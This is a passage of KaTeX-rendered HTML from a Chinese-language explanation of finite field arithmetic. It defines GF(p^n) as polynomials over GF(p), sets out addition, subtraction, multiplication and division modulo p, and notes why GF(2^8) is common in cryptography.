class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mclose">}</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">合</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">示</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">即</span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1246639999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8746639999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">}</span><span class="mord cjk_fallback">。</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>若将</mtext><mi>G</mi><mi>F</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mtext>上的加法单位元记作</mtext><mn>0</mn><mtext>，乘法单位元记作</mtext><mn>1</mn><mtext>；元素</mtext><mi>a</mi><mtext>的加法逆元记作</mtext><mo>−</mo><mi>a</mi><mtext>，非零元素</mtext><mi>b</mi><mtext>的乘法逆元记作</mtext><msup><mi>b</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mspace linebreak="newline"></mspace><mtext>则有：</mtext><mi>a</mi><mo>+</mo><mo stretchy="false">(</mo><mo>−</mo><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>b</mi><mo>×</mo><msup><mi>b</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><mn>1</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mo stretchy="false">)</mo><mtext>。</mtext><mspace linebreak="newline"></mspace><mtext>针对</mtext><mi>G</mi><mi>F</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mtext>中的元素</mtext><mi>a</mi><mtext>和非零元素</mtext><mi>b</mi><mspace linebreak="newline"></mspace><mtext>加法是</mtext><mo stretchy="false">(</mo><mi>a</mi><mo>+</mo><mi>b</mi><mo stretchy="false">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mspace linebreak="newline"></mspace><mtext>减法是</mtext><mo stretchy="false">(</mo><mi>a</mi><mo>+</mo><mo stretchy="false">(</mo><mo>−</mo><mi>b</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mspace linebreak="newline"></mspace><mtext>乘法是</mtext><mi>a</mi><mo>×</mo><mi>b</mi><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mspace linebreak="newline"></mspace><mtext>除法是</mtext><mi>a</mi><mo>×</mo><msup><mi>b</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mspace linebreak="newline"></mspace><mtext>该算法对多项式运算同样成立</mtext><mspace linebreak="newline"></mspace><mtext>因此</mtext><mi>G</mi><mi>F</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mi>n</mi></msup><mo stretchy="false">)</mo><mtext>上的四则运算可以由</mtext><mi>G</mi><mi>F</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mtext>上多项式的四则运算导出。</mtext></mrow><annotation encoding="application/x-tex">若将 GF(p) 上的加法单位元记作 0，乘法单位元记作 1；元素 a 的加法逆元记作 -a，非零元素 b 的乘法逆元记作 b^{-1}\\则有：a + (-a) = 0 (mod p), b × b^{-1} = 1 (mod p)。\\针对 GF(p) 中的元素 a 和非零元素 b\\加法是 (a + b) mod p\\减法是 (a + (-b)) mod p\\乘法是 a × b mod p\\除法是 a × b^{-1} mod p\\该算法对多项式运算同样成立\\因此 GF(p^n) 上的四则运算可以由 GF(p) 上多项式的四则运算导出。
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">若</span><span class="mord cjk_fallback">将</span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">加</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">单</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">记</span><span class="mord cjk_fallback">作</span><span class="mord">0</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">单</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">记</span><span class="mord cjk_fallback">作</span><span class="mord">1</span><span class="mord cjk_fallback">；</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">素</span><span class="mord mathnormal">a</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">加</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">逆</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">记</span><span class="mord cjk_fallback">作</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.864108em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">非</span><span class="mord cjk_fallback">零</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">素</span><span class="mord mathnormal">b</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">逆</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">记</span><span class="mord cjk_fallback">作</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">：</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">−</span><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.864108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord cjk_fallback">。</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">针</span><span class="mord cjk_fallback">对</span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">素</span><span class="mord mathnormal">a</span><span class="mord cjk_fallback">和</span><span class="mord cjk_fallback">非</span><span class="mord cjk_fallback">零</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">素</span><span class="mord mathnormal">b</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">加</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">是</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">减</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">是</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">−</span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mclose">)</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">是</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">除</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">是</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.058548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">该</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">运</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">样</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">立</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">此</span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">四</span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">运</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">由</span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">四</span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">运</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">导</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">。</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>特别地，当</mtext><mi>p</mi><mo>=</mo><mn>2</mn><mtext>时，</mtext><mi>G</mi><mi>F</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mi>n</mi></msup><mo stretchy="false">)</mo><mtext>中的元素</mtext><msup><mi>a</mi><mn>0</mn></msup><mo>+</mo><msup><mi>a</mi><mn>1</mn></msup><mi>x</mi><mo>+</mo><msup><mi>a</mi><mn>2</mn></msup><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msup><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup><msup><mi>x</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup><mtext>可以转化为二进制数</mtext><msup><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msup><mi>a</mi><mn>2</mn></msup><mo separator="true">,</mo><msup><mi>a</mi><mn>1</mn></msup><mo separator="true">,</mo><msup><mi>a</mi><mn>0</mn></msup><mi mathvariant="normal">.</mi><mspace linebreak="newline"></mspace><mtext>因为计算机中使用的是二进制数，且</mtext><mn>1</mn><mtext>字节为</mtext><mn>8</mn><mtext>位，所以在密码学中常常用到有限域</mtext><mi>G</mi><mi>F</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mn>8</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">特别地，当 p=2 时，GF(2^n) 中的元素 a^0 + a^1 x + a^2 x^2 + ... + a^{n-1} x^{n-1} 可以转化为二进制数 a^{n-1} ... a^2, a^1, a^0.\\因为计算机中使用的是二进制数，且 1 字节为 8 位，所以在密码学中常常用到有限域 GF(2^8)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">别</span><span class="mord cjk_fallback">地</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">当</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">素</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.058548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">转</span><span class="mord cjk_fallback">化</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">二</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">制</span><span class="mord cjk_fallback">数</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span><span class="mord">.</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">机</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">二</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">制</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">且</span><span class="mord">1</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">节</span><span class="mord cjk_fallback">为</span><span class="mord">8</span><span class="mord cjk_fallback">位</span><span class="mord 